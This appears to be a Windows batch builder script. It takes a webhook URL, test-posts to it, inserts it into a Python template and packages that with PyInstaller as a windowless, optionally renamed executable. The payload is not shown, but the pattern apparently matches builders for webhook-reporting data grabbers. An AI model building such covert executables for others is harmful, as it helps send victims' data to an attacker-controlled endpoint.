@echo off
color 3

set /p webhook="Enter the webhook URL: "


set /p testwebhook="Do you want to test the webhook? (y/n): "
if /i "%testwebhook%"=="y" (
    echo Testing the webhook...

    powershell -Command "try {Invoke-RestMethod -Uri '%webhook%' -Method POST -ContentType 'application/json' -Body '{\"content\":\"goob says hi, say hi to goob\"}'; exit 0} catch {exit 1}"

    if errorlevel 1 (
        echo Webhook is not valid.
        pause
        exit /b
    ) else (
        echo Webhook is valid. Proceeding with the build.
    )
) else (
    echo Skipping webhook test.
)

copy "SRC\script.py" "SRC\script_backup.py" >nul

powershell -Command "(Get-Content 'SRC\script.py') -replace '{{WEBHOOK}}', '%webhook%' | Set-Content 'SRC\script.py'"

:rename_prompt
set /p rename="Do you want to rename the output executable? (y/n): "
if /i "%rename%"=="y" (
    set /p newname="Enter the new name for the executable (without extension): "
    set "outputfile=dist\%newname%.exe"
) else if /i "%rename%"=="n" (
    set "outputfile=dist\script.exe"
) else (
    echo Invalid input. Please type "y" for yes or "n" for no.
    goto rename_prompt
)

echo Building the executable...

if defined newname (
    pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC\script.py --name "%newname%"
) else (
    pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC\script.py --name "script"
)

copy "SRC\script_backup.py" "SRC\script.py" >nul

del "SRC\script_backup.py" >nul

echo Build complete! The executable is in the 'dist' folder as "%outputfile%".
pause
